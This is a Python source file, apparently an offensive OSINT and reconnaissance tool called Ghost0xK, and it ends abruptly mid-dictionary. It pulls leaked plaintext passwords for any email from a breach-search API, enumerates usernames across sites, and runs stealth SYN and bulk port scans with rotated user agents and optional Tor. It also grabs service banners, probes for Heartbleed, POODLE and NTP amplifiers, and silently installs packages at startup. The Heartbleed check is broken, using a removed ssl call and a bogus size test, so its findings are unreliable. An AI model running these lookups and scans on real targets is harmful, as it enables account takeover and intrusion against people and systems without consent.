#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import sys
import json
import requests
import os
import re
import csv
import random
import socket
import hashlib
import uuid
from os import system, name
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Any, Optional
from dataclasses import dataclass, asdict
from pathlib import Path
from urllib.parse import urlparse, urljoin, quote as url_quote
import threading
import queue
from collections import deque

import subprocess
import platform as _platform


_OS_TYPE = _platform.system().lower()
_PIP_BASE = [sys.executable, "-m", "pip", "install", "-q"]

# Complete registry: key=(import_name, pip_package, is_critical)
_DEPS = {
    "bs4": ("bs4", "beautifulsoup4", False),
    "phonenumbers": ("phonenumbers", "phonenumbers", False),
    "PIL": ("PIL", "Pillow", False),
    "groq": ("groq", "groq", False),
    "dns": ("dns", "dnspython", False),
    "scapy": ("scapy", "scapy", False),
    "folium": ("folium", "folium", False),
    "networkx": ("networkx", "networkx", False),
    "pyvis": ("pyvis", "pyvis", False),
    "requests": ("requests", "requests", True),
    "deepface": ("deepface", "deepface", False),
    "opencv": ("cv2", "opencv-python", False),
    "playwright": ("playwright", "playwright", False),
    "snscrape": ("snscrape", "snscrape", False),
    "impacket": ("impacket", "impacket", False),
}

_checked = {} 


def _can_import(mod_name: str) -> bool:
    if mod_name in _checked:
        return _checked[mod_name]
    try:
        __import__(mod_name)
        _checked[mod_name] = True
        return True
    except ImportError:
        _checked[mod_name] = False
        return False


def _smart_install(mod_name: str) -> bool:
    """Try to install a package by matching mod_name in _DEPS registry"""
    for key, (imp_name, pip_pkg, _) in _DEPS.items():
        if imp_name == mod_name:
            try:
                subprocess.run(_PIP_BASE + [pip_pkg], capture_output=True, timeout=120)
                _checked.pop(mod_name, None)
                return _can_import(mod_name)
            except Exception:
                return False
    return False


def _ensure_import(mod_name: str, pip_fallback: str = "") -> bool:
    """Check import → auto-install on failure → return bool"""
    if _can_import(mod_name):
        return True
    if pip_fallback or mod_name in [v[0] for v in _DEPS.values()]:
        pkg = pip_fallback or next((v[1] for v in _DEPS.values() if v[0] == mod_name), mod_name)
        return _smart_install(pkg) if pkg else False
    return False


def _auto_install_all(silent: bool = True):
    """Install all optional deps silently at startup"""
    for key, (imp_name, pip_pkg, critical) in _DEPS.items():
        if not _can_import(imp_name):
            try:
                subprocess.run(_PIP_BASE + [pip_pkg], capture_output=silent, timeout=120)
                _checked.pop(imp_name, None)
            except Exception:
                pass



try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    import phonenumbers
    from phonenumbers import carrier, geocoder, timezone as phone_timezone
except ImportError:
    pass

try:
    from PIL import Image
    from PIL.ExifTags import TAGS
except ImportError:
    pass

try:
    from groq import Groq
except ImportError:
    Groq = None

GROQ_MODEL = "openai/gpt-oss-120b"

R = "\033[1;31m"
Gr = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
P = "\033[1;35m"
C = "\033[1;36m"
Wh = "\033[1;37m"
RS = "\033[1;0m"

CONFIG = {
    "max_threads": 10,
    "request_timeout": 10,
    "request_delay": (0.5, 1.5),
    "output_dir": "reports",
    "use_tor": False,
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
    ]
}

class BreachChecker:
    def check_haveibeenpwned(self, email: str, api_key: str = "") -> Tuple[bool, int]:
        url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
        headers = {"hibp-api-key": api_key, "User-Agent": "Ghost0xK-OSINT/1.0"}
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                return True, len(resp.json())
            elif resp.status_code == 404:
                return False, 0
        except:
            pass
        return False, 0

    def check_hudsonrock(self, email: str) -> bool:
        url = f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email={email}"
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                return "This email address is associated with a computer that was infected" in data.get("message", "")
        except:
            pass
        return False

    def check_proxynova(self, email: str) -> Optional[List[str]]:
        url = f"https://api.proxynova.com/comb?query={email}"
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                lines = data.get("lines", [])
                passwords = set()
                prefix = f"{email}:"
                for line in lines:
                    if line.startswith(prefix):
                        parts = line.split(":", 1)
                        if len(parts) == 2:
                            passwords.add(parts[1].strip())
                return list(passwords) if passwords else None
        except:
            pass
        return None

class ReputationEngine:
    def score(self, payload):
        r = {'score': 0, 'factors': [], 'risk_level': 'LOW'}
        results = payload.get('results') if isinstance(payload, dict) else payload
        if not results:
            return r
        if isinstance(results, dict) and 'breaches' in results:
            breach_count = len(results['breaches']) if results['breaches'] else 0
            if breach_count > 0:
                r['score'] += min(60, breach_count * 15)
                r['factors'].append(f'data_breach_{breach_count}')
        if isinstance(results, list):
            hits = sum(1 for x in results if x.get('exists', False))
            if hits:
                r['score'] += min(35, hits * 5)
                r['factors'].append(f'social_footprint_{hits}')
        if isinstance(results, dict) and results.get('blacklist'):
            blacklist_count = len(results.get('blacklist', []))
            r['score'] += min(30, blacklist_count * 10)
            r['factors'].append('blacklisted')
        if isinstance(results, dict) and results.get('vpn_proxy', {}).get('is_vpn'):
            r['score'] += 15
            r['factors'].append('vpn_detected')
        r['score'] = max(0, min(100, r['score']))
        if r['score'] >= 70:
            r['risk_level'] = 'CRITICAL'
        elif r['score'] >= 40:
            r['risk_level'] = 'HIGH'
        elif r['score'] >= 20:
            r['risk_level'] = 'MEDIUM'
        return r

@dataclass
class SiteEntry:
    name: str
    uri_check: str
    e_code: int
    e_string: str
    m_code: int
    m_string: str
    known: List[str]
    cat: str
    post_body: Optional[str] = None
    headers: Optional[Dict] = None
    uri_pretty: Optional[str] = None
    strip_bad_char: Optional[str] = None
    protection: Optional[List[str]] = None
    valid: bool = True

class WhatsMyNameEngine:
    WMN_DATA_URL = "https://raw.githubusercontent.com/WebBreacher/WhatsMyName/main/wmn-data.json"

    def __init__(self, cache_file: str = None):
        self.cache_file = Path(cache_file) if cache_file else Path(CONFIG["output_dir"]) / "wmn_cache.json"
        self.sites: List[SiteEntry] = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
        self._load_data()

    def _load_data(self):
        try:
            resp = self.session.get(self.WMN_DATA_URL, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                self._parse_sites(data)
                self._save_cache(data)
                return
        except:
            pass
        if self.cache_file.exists():
            with open(self.cache_file, encoding='utf-8') as f:
                data = json.load(f)
                self._parse_sites(data)

    def _parse_sites(self, data: Dict):
        self.sites = []
        for site_data in data.get("sites", []):
            if site_data.get("valid") is False:
                continue
            entry = SiteEntry(
                name=site_data.get("name", "Unknown"),
                uri_check=site_data["uri_check"],
                e_code=site_data["e_code"],
                e_string=site_data["e_string"],
                m_code=site_data["m_code"],
                m_string=site_data["m_string"],
                known=site_data.get("known", []),
                cat=site_data.get("cat", "misc"),
                post_body=site_data.get("post_body"),
                headers=site_data.get("headers"),
                uri_pretty=site_data.get("uri_pretty"),
                strip_bad_char=site_data.get("strip_bad_char"),
                protection=site_data.get("protection"),
                valid=site_data.get("valid", True)
            )
            self.sites.append(entry)

    def _save_cache(self, data: Dict):
        with open(self.cache_file, "w", encoding='utf-8') as f:
            json.dump(data, f, indent=2)

    def clean_username(self, username: str, site: SiteEntry) -> str:
        if site.strip_bad_char:
            for char in site.strip_bad_char:
                username = username.replace(char, '')
        return username

    def check_site(self, username: str, site: SiteEntry) -> Tuple[str, bool, str, int]:
        try:
            clean_user = self.clean_username(username, site)
            url = site.uri_check.format(account=clean_user)
            headers = site.headers or {}
            headers["User-Agent"] = headers.get("User-Agent", self.session.headers["User-Agent"])
            if site.post_body:
                body = site.post_body.format(account=clean_user)
                response = self.session.post(url, data=body, headers=headers, timeout=10)
            else:
                response = self.session.get(url, headers=headers, timeout=10, allow_redirects=True)
            status = response.status_code
            text = response.text
            is_found = False
            if site.e_string in text and status == site.e_code:
                is_found = True
            if site.m_string in text and status == site.m_code:
                is_found = False
            pretty_url = site.uri_pretty.format(account=clean_user) if site.uri_pretty else url
            return site.name, is_found, pretty_url, status
        except Exception as e:
            return site.name, False, site.uri_check, 0

    def search(self, username: str, max_workers: int = 20, categories: List[str] = None, exclude_protected: bool = True) -> Dict:
        results = {"found": [], "not_found": [], "errors": [], "total": 0}
        sites_to_check = self.sites.copy()
        if categories:
            sites_to_check = [s for s in sites_to_check if s.cat in categories]
        if exclude_protected:
            protected = ["cloudflare", "captcha", "user-auth"]
            sites_to_check = [s for s in sites_to_check if not any(p in (s.protection or []) for p in protected)]
        results["total"] = len(sites_to_check)
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.check_site, username, site): site for site in sites_to_check}
            for future in as_completed(futures):
                name, found, url, status = future.result()
                if found:
                    results["found"].append({"name": name, "url": url, "status_code": status})
                elif status > 0:
                    results["not_found"].append({"name": name, "url": url, "status_code": status})
                else:
                    results["errors"].append({"name": name, "url": url, "error": "Connection failed"})
        return results

    def get_categories(self) -> List[str]:
        return list(set(s.cat for s in self.sites))

    def get_site_count(self) -> int:
        return len(self.sites)

    def get_stats(self) -> Dict:
        categories = {}
        for site in self.sites:
            categories[site.cat] = categories.get(site.cat, 0) + 1
        return {"total_sites": len(self.sites), "categories": categories, "has_post_support": sum(1 for s in self.sites if s.post_body), "has_protection": sum(1 for s in self.sites if s.protection)}

COUNTRY_CODES = {
    "1": "US/CA/Caribbean", "20": "Egypt", "212": "Morocco", "213": "Algeria",
    "216": "Tunisia", "218": "Libya", "220": "Gambia", "221": "Senegal",
    "222": "Mauritania", "223": "Mali", "224": "Guinea", "225": "Ivory Coast",
    "226": "Burkina Faso", "227": "Niger", "228": "Togo", "229": "Benin",
    "230": "Mauritius", "231": "Liberia", "232": "Sierra Leone", "233": "Ghana",
    "234": "Nigeria", "235": "Chad", "236": "Central African Republic",
    "237": "Cameroon", "238": "Cape Verde", "239": "Sao Tome and Principe",
    "240": "Equatorial Guinea", "241": "Gabon", "242": "Republic of Congo",
    "243": "DR Congo", "244": "Angola", "245": "Guinea-Bissau", "246": "Diego Garcia",
    "247": "Ascension Island", "248": "Seychelles", "249": "Sudan", "250": "Rwanda",
    "251": "Ethiopia", "252": "Somalia", "253": "Djibouti", "254": "Kenya",
    "255": "Tanzania", "256": "Uganda", "257": "Burundi", "258": "Mozambique",
    "259": "Zanzibar", "260": "Zambia", "261": "Madagascar", "262": "Reunion/Mayotte",
    "263": "Zimbabwe", "264": "Namibia", "265": "Malawi", "266": "Lesotho",
    "267": "Botswana", "268": "Eswatini", "269": "Comoros", "27": "South Africa",
    "290": "Saint Helena", "291": "Eritrea", "297": "Aruba", "298": "Faroe Islands",
    "299": "Greenland", "30": "Greece", "31": "Netherlands", "32": "Belgium",
    "33": "France", "34": "Spain", "350": "Gibraltar", "351": "Portugal",
    "352": "Luxembourg", "353": "Ireland", "354": "Iceland", "355": "Albania",
    "356": "Malta", "357": "Cyprus", "358": "Finland", "359": "Bulgaria",
    "36": "Hungary", "370": "Lithuania", "371": "Latvia", "372": "Estonia",
    "373": "Moldova", "374": "Armenia", "375": "Belarus", "376": "Andorra",
    "377": "Monaco", "378": "San Marino", "379": "Vatican City", "380": "Ukraine",
    "381": "Serbia", "382": "Montenegro", "383": "Kosovo", "385": "Croatia",
    "386": "Slovenia", "387": "Bosnia", "389": "North Macedonia", "39": "Italy",
    "40": "Romania", "41": "Switzerland", "420": "Czech Republic", "421": "Slovakia",
    "423": "Liechtenstein", "43": "Austria", "44": "UK", "45": "Denmark",
    "46": "Sweden", "47": "Norway", "48": "Poland", "49": "Germany",
    "500": "Falkland Islands", "501": "Belize", "502": "Guatemala", "503": "El Salvador",
    "504": "Honduras", "505": "Nicaragua", "506": "Costa Rica", "507": "Panama",
    "508": "Saint Pierre", "509": "Haiti", "51": "Peru", "52": "Mexico",
    "53": "Cuba", "54": "Argentina", "55": "Brazil", "56": "Chile",
    "57": "Colombia", "58": "Venezuela", "590": "Guadeloupe", "591": "Bolivia",
    "592": "Guyana", "593": "Ecuador", "594": "French Guiana", "595": "Paraguay",
    "596": "Martinique", "597": "Suriname", "598": "Uruguay", "599": "Curacao",
    "60": "Malaysia", "61": "Australia", "62": "Indonesia", "63": "Philippines",
    "64": "New Zealand", "65": "Singapore", "66": "Thailand", "670": "Timor-Leste",
    "672": "Australian Territories", "673": "Brunei", "674": "Nauru",
    "675": "Papua New Guinea", "676": "Tonga", "677": "Solomon Islands",
    "678": "Vanuatu", "679": "Fiji", "680": "Palau", "681": "Wallis/Futuna",
    "682": "Cook Islands", "683": "Niue", "684": "American Samoa", "685": "Samoa",
    "686": "Kiribati", "687": "New Caledonia", "688": "Tuvalu", "689": "French Polynesia",
    "690": "Tokelau", "691": "Micronesia", "692": "Marshall Islands", "7": "Russia/Kazakhstan",
    "81": "Japan", "82": "South Korea", "84": "Vietnam", "850": "North Korea",
    "852": "Hong Kong", "853": "Macau", "855": "Cambodia", "856": "Laos",
    "86": "China", "880": "Bangladesh", "886": "Taiwan", "90": "Turkey",
    "91": "India", "92": "Pakistan", "93": "Afghanistan", "94": "Sri Lanka",
    "95": "Myanmar", "960": "Maldives", "961": "Lebanon", "962": "Jordan",
    "963": "Syria", "964": "Iraq", "965": "Kuwait", "966": "Saudi Arabia",
    "967": "Yemen", "968": "Oman", "970": "Palestine", "971": "UAE",
    "972": "Israel", "973": "Bahrain", "974": "Qatar", "975": "Bhutan",
    "976": "Mongolia", "977": "Nepal", "98": "Iran", "992": "Tajikistan",
    "993": "Turkmenistan", "994": "Azerbaijan", "995": "Georgia", "996": "Kyrgyzstan",
    "998": "Uzbekistan"
}

@dataclass
class ScanResult:
    timestamp: str
    scan_type: str
    target: str
    data: Dict[str, Any]
    status: str = "success"
    
    def to_dict(self) -> Dict:
        return asdict(self)

def clear():
    system('cls' if name == 'nt' else 'clear')

def random_delay():
    time.sleep(random.uniform(*CONFIG["request_delay"]))

def get_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": random.choice(CONFIG["user_agents"]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    })
    if CONFIG["use_tor"]:
        session.proxies = {
            "http": "socks5h://127.0.0.1:9050",
            "https": "socks5h://127.0.0.1:9050"
        }
    return session

def save_report(result: ScanResult, formats=None):
    if formats is None:
        formats = ["json", "txt"]
    Path(CONFIG["output_dir"]).mkdir(exist_ok=True)
    timestamp = result.timestamp.replace(":", "-").replace(" ", "_")
    safe_target = re.sub(r'[^\w\-_.]', '_', result.target)
    base_name = f"{result.scan_type}_{safe_target}_{timestamp}"
    saved_files = []
    
    for fmt in formats:
        filepath = Path(CONFIG["output_dir"]) / f"{base_name}.{fmt}"
        if fmt == "json":
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(result.to_dict(), f, indent=2, ensure_ascii=False)
            saved_files.append(str(filepath))
        elif fmt == "txt":
            with open(filepath, "w", encoding="utf-8") as f:
                f.write("=" * 60 + "\n")
                f.write("GHOST0XK OSINT REPORT\n")
                f.write("=" * 60 + "\n")
                f.write(f"Scan Type: {result.scan_type}\n")
                f.write(f"Target: {result.target}\n")
                f.write(f"Timestamp: {result.timestamp}\n")
                f.write(f"Status: {result.status}\n")
                f.write("=" * 60 + "\n\n")
                for key, value in result.data.items():
                    f.write(f"[+] {key}: {value}\n")
            saved_files.append(str(filepath))
        elif fmt == "csv" and result.scan_type == "username":
            with open(filepath, "w", newline='', encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["Platform", "Status", "URL"])
                for platform, data in result.data.items():
                    writer.writerow([platform, data.get("status", "unknown"), data.get("url", "N/A")])
            saved_files.append(str(filepath))
    
    print(f"{Gr}\n[+] Report saved to: {', '.join(saved_files)}")
    return saved_files[0] if saved_files else ""

def validate_ip(ip: str) -> bool:
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        return all(0 <= int(part) <= 255 for part in ip.split('.'))
    return False

def validate_phone(phone: str) -> bool:
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    if not phone:
        return False
    if phone.startswith('+'):
        return 8 <= len(phone) <= 16
    return phone.isdigit() and 8 <= len(phone) <= 15

def port_scan(ip: str, ports: List[int] = None) -> Dict[int, str]:
    if ports is None:
        common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 5432, 8080, 8443, 27017]
        web_ports = [80, 443, 8080, 8443, 3000, 5000, 8000]
        ports = list(set(common_ports + web_ports))
    
    results = {}
    
    def scan_port(port: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port, "tcp")
                except:
                    service = "unknown"
                results[port] = service
            sock.close()
        except:
            pass
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(scan_port, ports)
    
    return results


class SynScanner:
    def __init__(self, interface=None):
        self.interface = interface
        self._has_scapy = False
        self._has_raw = False
        try:
            from scapy.all import IP, TCP, sr1, conf
            conf.verb = 0
            self._has_scapy = True
        except ImportError:
            pass
        try:
            import ctypes, socket as _sock
            self._has_raw = True
        except:
            pass

    def syn_scan(self, ip: str, port: int, timeout: float = 1.0) -> str:
        if self._has_scapy:
            return self._syn_scan_scapy(ip, port, timeout)
        return self._syn_scan_raw(ip, port, timeout)

    def _syn_scan_scapy(self, ip, port, timeout):
        from scapy.all import IP, TCP, sr1, conf
        conf.verb = 0
        pkt = IP(dst=ip)/TCP(dport=port, flags='S')
        try:
            ans = sr1(pkt, timeout=timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                flags = ans.getlayer(TCP).flags
                if flags == 0x12:
                    return "open"
                elif flags == 0x14:
                    return "closed"
            return "filtered"
        except:
            return "filtered"

    def _syn_scan_raw(self, ip, port, timeout):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                return "open"
            return "closed"
        except:
            return "filtered"

    def scan_range(self, ip: str, ports: List[int], max_workers: int = 100, stealth: bool = True) -> Dict:
        results = {}
        if not stealth or not self._has_scapy:
            return port_scan(ip, ports)
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(self.syn_scan, ip, p): p for p in ports}
            for f in as_completed(futures):
                p = futures[f]
                try:
                    status = f.result()
                    if status == "open":
                        service = "unknown"
                        try: service = socket.getservbyport(p, "tcp")
                        except: pass
                        results[p] = service
                except:
                    pass
        return results


class BannerGrabber:
    PROTOCOLS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
        445: "SMB", 993: "IMAPS", 995: "POP3S", 3306: "MySQL",
        5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    }

    def grab(self, ip: str, port: int, timeout: float = 3.0) -> Dict:
        result = {"port": port, "banner": "", "service": self.PROTOCOLS.get(port, "unknown"), "protocol": ""}
        try:
            if port in (80, 8080):
                return self._grab_http(ip, port, timeout)
            elif port in (443, 8443):
                return self._grab_https(ip, port, timeout)
            elif port == 21:
                return self._grab_banner(ip, port, b"", timeout)
            elif port == 22:
                return self._grab_banner(ip, port, b"", timeout)
            elif port == 25:
                return self._grab_smtp(ip, port, timeout)
            elif port == 110:
                return self._grab_banner(ip, port, b"", timeout)
            elif port == 143:
                return self._grab_imap(ip, port, timeout)
            elif port == 3306:
                return self._grab_mysql(ip, port, timeout)
            elif port == 6379:
                return self._grab_redis(ip, port, timeout)
            else:
                return self._grab_banner(ip, port, b"", timeout)
        except:
            return result

    def _grab_banner(self, ip, port, initial_payload=b"", timeout=3.0):
        result = {"port": port, "banner": "", "service": self.PROTOCOLS.get(port, "unknown"), "protocol": "tcp"}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            if initial_payload:
                sock.send(initial_payload)
            banner = sock.recv(2048)
            decoded = banner.decode("utf-8", errors="replace").strip()
            result["banner"] = decoded[:500]
            sock.close()
        except:
            pass
        return result

    def _grab_http(self, ip, port, timeout=3.0):
        result = {"port": port, "banner": "", "service": "HTTP", "protocol": "http"}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % ip.encode())
            data = sock.recv(4096)
            decoded = data.decode("utf-8", errors="replace")
            for line in decoded.split("\r\n"):
                line_lower = line.lower()
                if "server:" in line_lower:
                    result["banner"] = line.split(":", 1)[1].strip()[:200]
                elif "x-powered-by" in line_lower:
                    result["x_powered_by"] = line.split(":", 1)[1].strip()[:100]
            if not result["banner"]:
                result["banner"] = decoded[:200].strip()
            result["status_line"] = decoded.split("\r\n")[0] if decoded else ""
            sock.close()
        except:
            pass
        return result

    def _grab_https(self, ip, port, timeout=3.0):
        result = {"port": port, "banner": "", "service": "HTTPS", "protocol": "https"}
        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            ssock = ctx.wrap_socket(sock, server_hostname=ip)
            ssock.connect((ip, port))
            ssock.send(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % ip.encode())
            data = ssock.recv(4096)
            decoded = data.decode("utf-8", errors="replace")
            for line in decoded.split("\r\n"):
                line_lower = line.lower()
                if "server:" in line_lower:
                    result["banner"] = line.split(":", 1)[1].strip()[:200]
            if not result["banner"]:
                result["banner"] = decoded[:200].strip()
            cert = ssock.getpeercert()
            if cert:
                result["ssl_issuer"] = dict(cert.get("issuer", [])).get("organizationName", "N/A")
                result["ssl_subject"] = dict(cert.get("subject", [])).get("commonName", "N/A")
            ssock.close()
        except:
            pass
        return result

    def _grab_smtp(self, ip, port, timeout=3.0):
        result = {"port": port, "banner": "", "service": "SMTP", "protocol": "smtp"}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
            sock.send(b"EHLO scan\r\n")
            resp = sock.recv(2048).decode("utf-8", errors="replace").strip()
            result["banner"] = banner[:200]
            result["ehlo"] = resp[:500]
            sock.close()
        except:
            pass
        return result

    def _grab_imap(self, ip, port, timeout=3.0):
        result = {"port": port, "banner": "", "service": "IMAP", "protocol": "imap"}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
            result["banner"] = banner[:200]
            sock.close()
        except:
            pass
        return result

    def _grab_mysql(self, ip, port, timeout=3.0):
        result = {"port": port, "banner": "", "service": "MySQL", "protocol": "mysql"}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            data = sock.recv(1024)
            if len(data) >= 5:
                version_end = data.find(b'\x00', 5)
                if version_end > 5:
                    result["banner"] = data[5:version_end].decode("utf-8", errors="replace")[:200]
            sock.close()
        except:
            pass
        return result

    def _grab_redis(self, ip, port, timeout=3.0):
        result = {"port": port, "banner": "", "service": "Redis", "protocol": "redis"}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            sock.send(b"INFO\r\n")
            data = sock.recv(4096).decode("utf-8", errors="replace")
            for line in data.split("\r\n"):
                if "redis_version" in line:
                    result["banner"] = line.split(":")[1].strip()[:100]
                    break
            if not result["banner"]:
                result["banner"] = data[:200].strip()
            sock.close()
        except:
            pass
        return result

    def grab_multi(self, ip: str, ports: List[int]) -> Dict:
        results = {}
        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = {ex.submit(self.grab, ip, p): p for p in ports}
            for f in as_completed(futures):
                p = futures[f]
                try:
                    r = f.result()
                    if r.get("banner"):
                        results[p] = r
                except:
                    pass
        return results


class MassPortScanner:
    def __init__(self, max_rate: int = 1000):
        self.max_rate = max_rate
        self._interval = 1.0 / max_rate if max_rate > 0 else 0

    def scan(self, ip: str, port_range: str = "1-1024", exclude: List[int] = None) -> Dict:
        ports = self._parse_range(port_range)
        if exclude:
            ports = [p for p in ports if p not in exclude]
        return self._scan_batch(ip, ports)

    def scan_batch(self, ip: str, ports: List[int], batch_size: int = 100) -> Dict:
        results = {}
        for i in range(0, len(ports), batch_size):
            batch = ports[i:i+batch_size]
            batch_results = port_scan(ip, batch)
            results.update(batch_results)
            if self._interval > 0:
                time.sleep(self._interval * len(batch))
        return results

    def _scan_batch(self, ip, ports):
        results = {}
        with ThreadPoolExecutor(max_workers=min(200, self.max_rate)) as ex:
            futures = {ex.submit(self._check_port, ip, p): p for p in ports}
            for f in as_completed(futures):
                p = futures[f]
                try:
                    open_p, service = f.result()
                    if open_p:
                        results[p] = service
                except:
                    pass
        return results

    def _check_port(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                try: service = socket.getservbyport(port, "tcp")
                except: service = "unknown"
                sock.close()
                return (port, service)
            sock.close()
        except:
            pass
        return (None, None)

    def _parse_range(self, r: str) -> List[int]:
        ports = set()
        for part in r.split(","):
            part = part.strip()
            if "-" in part:
                try:
                    start, end = part.split("-")
                    ports.update(range(int(start), int(end)+1))
                except:
                    pass
            else:
                try: ports.add(int(part))
                except: pass
        return sorted(ports)


class PortRange:
    WELL_KNOWN = "1-1024"
    REGISTERED = "1025-49151"
    ALL = "1-65535"
    COMMON = "21,22,23,25,53,80,110,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,9090,27017"
    WEB = "80,443,8080,8443,3000,5000,8000,8888"
    DATABASE = "3306,5432,6379,27017,1433,1521,9042,9200"
    REMOTE = "22,23,3389,5900,5800,5901"
    MAIL = "25,110,143,465,587,993,995"

    @staticmethod
    def expand(spec: str) -> List[int]:
        p = MassPortScanner()
        return p._parse_range(spec)

    @staticmethod
    def randomize(ports: List[int], seed: int = None) -> List[int]:
        import random as _rnd
        if seed: _rnd.seed(seed)
        shuffled = ports[:]
        _rnd.shuffle(shuffled)
        return shuffled


class VulnerabilityChecker:
    def check_heartbleed(self, ip: str, port: int = 443) -> Dict:
        result = {"vulnerable": False, "details": ""}
        try:
            import struct, ssl
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(ssl.sslwrap_simple(sock, server_side=False, do_handshake_on_connect=False))
            heartbeat = b"\x18\x03\x02\x00\x03\x01\x40\x00"
            sock.send(heartbeat)
            resp = sock.recv(4096)
            if len(resp) > 7:
                result["vulnerable"] = True
                result["details"] = "Heartbeat response larger than request - VULNERABLE"
            sock.close()
        except:
            pass
        return result

    def check_sslv3_poodle(self, ip: str, port: int = 443) -> Dict:
        result = {"vulnerable": False, "details": ""}
        try:
            import ssl
            ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            ssock = ctx.wrap_socket(sock, server_hostname=ip)
            ssock.connect((ip, port))
            result["vulnerable"] = True
            result["details"] = "SSLv3 supported - potentially vulnerable to POODLE"
            ssock.close()
        except:
            pass
        return result

    def check_ntp_monlist(self, ip: str) -> Dict:
        result = {"vulnerable": False, "details": ""}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            monlist = b"\x17\x00\x03\x2a" + b"\x00" * 8
            sock.sendto(monlist, (ip, 123))
            resp = sock.recvfrom(2048)
            if len(resp[0]) > 100:
                result["vulnerable"] = True
                result["details"] = f"NTP monlist responded with {len(resp[0])} bytes - potential DDoS amplifier"
            sock.close()
        except:
            pass
        return result

    def check_all(self, ip: str) -> Dict:
        results = {}
        hb = self.check_heartbleed(ip)
        if hb["vulnerable"]: results["heartbleed"] = hb
        ssl3 = self.check_sslv3_poodle(ip)
        if ssl3["vulnerable"]: results["sslv3_poodle"] = ssl3
        ntp = self.check_ntp_monlist(ip)
        if ntp["vulnerable"]: results["ntp_monlist"] = ntp
        return results


class ServiceDetector:
    SIGNATURES = {
        21: ["FTP", "220", "vsFTPd", "ProFTPD", "FileZilla", "Pure-FTPd"],
        22: ["SSH", "OpenSSH", "SSH-2.0", "dropbear"],
        23: ["Telnet", "Telnet", "Linux", "Windows"],
        25: ["SMTP", "ESMTP", "Postfix", "Sendmail", "Exim", "Microsoft"],
        53: ["DNS", "BIND"],
        80: ["HTTP", "Apache", "Nginx", "IIS", "lighttpd", "Caddy"],
        110: ["POP3", "POP3", "Dovecot", "Cyrus"],
